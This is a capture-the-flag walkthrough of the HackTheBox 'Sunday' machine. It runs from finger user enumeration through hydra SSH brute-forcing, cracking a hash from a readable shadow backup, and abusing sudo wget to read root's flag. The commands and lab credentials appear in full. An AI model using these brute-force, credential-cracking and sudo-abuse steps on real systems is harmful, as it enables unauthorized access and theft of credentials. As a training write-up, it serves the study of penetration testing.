# Sunday - Easy

```sh
sudo vim /etc/hosts
# add sunday.htb

nmap -T4 -p- -A -Pn -v sunday.htb
```

* open ports & services:

    * 79/tcp - finger?
    * 111/tcp - rpcbind 2-4
    * 515/tcp - printer
    * 3491/tcp - filtered - swr-port
    * 6787/tcp - http - Apache httpd
    * 22022/tcp - ssh - OpenSSH 8.4
    * 35858/tcp - unknown
    * 41828/tcp - unknown
    * 59710/tcp - unknown

* checking the service on port 79, if we try to interact with it, we get the fields - 'Login', 'Name', 'TTY', 'Idle', 'When', 'Where' - before the service quits:

    ```sh
    nc sunday.htb 79
    # entering anything will show the fields before quitting
    ```

* Googling about the service as well as port 79 confirms this is the Finger service, which provides info on logged-in users on a remote device

* ```finger``` [enumeration](https://www.verylazytech.com/network-pentesting/finger-port-79):

    ```sh
    echo "root" | nc sunday.htb 79
    # confirms root user exists

    msfconsole -q

    use auxiliary/scanner/finger/finger_users
    options
    set RHOSTS sunday.htb
    run
    # this finds multiple users

    # using finger-user-enum tool
    ./finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t sunday.htb

    ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t sunday.htb
    ```

* the ```metasploit``` module for finger enumeration finds several valid users:

    * adm
    * ikeuser
    * lp
    * dladm
    * netadm
    * netcfg
    * dhcpserv
    * bin
    * daemon
    * _ntp
    * ftp
    * noaccess
    * nobody
    * nobody4
    * root
    * sshd
    * sys
    * aiuser
    * openldap

* we can try checking for command injection in ```finger``` but that does not work

* using the ```finger-user-enum``` tool, we are able to find some more valid usernames - we can confirm if the username exists or not using the command ```echo <username> | nc sunday.htb 79```:

    * smmsp
    * sammy
    * sunny

* as we have a possibly valid list of usernames, we can check with the ```finger``` tool itself:

    ```sh
    finger @sunday.htb
    # 'no one logged on'

    finger -l sunny@sunday.htb
    # check user info for a specific user
    # test with all other usernames

    finger -l sammy@sunday.htb

    finger 0@sunday.htb
    # no extra info if we use '0' instead of username
    ```

* while ```finger``` does not show a lot of info, it does confirm that 'sammy' and 'sunny' are users on this box, with home directories ```/home/sammy``` & ```/home/sunny```

* we can check other services as well for any other clues

* enumerating RPC:

    ```sh
    rpcclient -U "" sunday.htb
    # NT_STATUS_CONNECTION_REFUSED

    rpcinfo -p sunday.htb
    # Authentication error
    ```

* for the service on port 515, Google shows that it is used by LPD (line printer daemon) - we can [enumerate it](https://www.verylazytech.com/network-pentesting/line-printer-daemon-lpd-port-515):

    ```sh
    sudo apt install lpr
    # install tools for lpd enumeration

    lpr --help

    lpstat --help

    lpstat -v -h sunday.htb
    # error - "no destinations added"

    lpstat -h sunday.htb:515
    # we are able to connect to the service, but no interaction available

    lpstat -h sunday.htb:515 -t
    # scheduler is running
    # no system default destination
    ```

* we can check the web service on port 6787 next

* if we try to access 'http://sunday.htb:6787', we get the error 'Bad Request' as the server is using SSL

* navigating to 'https://sunday.htb:6787', we get a login page for Oracle Solaris Dashboard

* the Solaris WebUI login page has only the username field and a 'start' button

* if we enter a random username, the page redirects to 'https://sunday.htb:6787/solaris/login/', and we are prompted to enter a password to login - if the creds don't match, we get an "authentication failed" message

* Googling for default creds for Oracle Solaris dashboard gives creds like 'jack:jack' and 'root:solaris' - but these don't work

* web enumeration:

    ```sh
    feroxbuster -u https://sunday.htb:6787 -k -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # recursive directory scanning, as there are multiple dirs here
    # -k to ignore TLS cert check

    feroxbuster -u https://sunday.htb:6787 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # medium wordlist

    ffuf -c -u 'https://sunday.htb:6787' -H 'Host: FUZZ.sunday.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 -fw 12 -s
    # subdomain scan
    ```

* web enumeration does not give anything useful, and common creds do not work in the login page

* at this stage, we can also attempt SSH bruteforce using ```hydra``` as we have 2 valid usernames - 'sunny' and 'sammy':

    ```sh
    vim users.txt
    # add both usernames

    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt sunday.htb -t 4 ssh -s 22022 -u
    # -s 22022 to specify port
    # -u to try each password with both usernames
    ```

* ```hydra``` SSH bruteforce works and we get the creds 'sunny:sunday' (easier way could have been to try the name of the challenge as the password)

* we can now login as 'sunny':

    ```sh
    ssh sunny@sunday.htb -p 22022
    # this works

    ls -la
    # check files

    cat .bash_history

    sudo -l
    # we can run '/root/troll' as root

    ls -la /home
    # we have user 'sammy' too

    ls -la /home/sammy
    # can list files, but user flag cannot be read
    ```

* the ```.bash_history``` file for 'sunny' user mentions a backup file at ```/backup/shadow.backup```, and a binary ```/root/troll```

* ```sudo -l``` also shows that 'sunny' can run the ```/root/troll``` binary as root

* we can check the ```/backup``` directory first:

    ```sh
    ls -la /
    # it exists

    ls -la /backup
    # we have two backup files

    cat /backup/agent22.backup

    cat /backup/shadow.backup

    md5sum /backup/*
    # both files are the exact same
    ```

* checking the ```shadow``` backup file, we have hashes for both users - we can try to crack the hash for 'sammy' user from this:

    ```sh
    # on attacker
    vim sammy.txt
    # paste 'sammy' hash from shadow file

    # hash identifier tool confirms this is in sha256crypt format
    # mode 7400 for hashcat

    hashcat -a 0 -m 7400 sammy.txt /usr/share/wordlists/rockyou.txt
    ```

* ```hashcat``` is able to crack the hash and gives the plaintext 'cooldude!' - we can now login as 'sammy':

    ```sh
    ssh sammy@sunday.htb -p 22022

    ls -la

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that we can run ```/usr/bin/wget``` as root without password

* we can use [the exploit from GTFObins](https://gtfobins.org/gtfobins/wget/) to abuse this:

    ```sh
    sudo /usr/bin/wget -i /root/root.txt
    # file read abuse for wget
    # this leaks root flag in error message
    ```
